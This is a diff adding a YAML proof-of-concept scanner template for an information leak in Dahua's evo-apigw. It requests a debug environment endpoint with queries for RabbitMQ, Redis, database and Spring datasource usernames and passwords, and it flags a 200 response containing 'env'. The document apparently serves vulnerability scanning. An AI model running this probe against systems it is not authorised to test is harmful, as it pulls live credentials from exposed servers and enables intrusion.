@@ -1,0 +1,27 @@
+name: poc-yaml-dahua-infoleak-discovery
+sets:
+  query:
+    - "service.rabbitmq.username"
+    - "service.rabbitmq.password"
+    - "service.redis.password"
+    - "config.service.db.ip"
+    - "config.service.db.port"
+    - "config.service.db.account.name"
+    - "config.service.db.account.pwd"
+    - "config.service.db.database"
+    - "spring.datasource.default.url"
+    - "spring.datasource.default.username"
+    - "spring.datasource.default.password"
+rules:
+  - method: GET
+    path: /evo-apigw/evo-cascade/debug/context/env?query={{query}}
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    expression: |
+      response.status == 200 && response.body.bcontains(b"env")
+detail:
+  author: lxy
+  description: Dahua evo-apigw debug context env information leak
+  links:
+    - https://
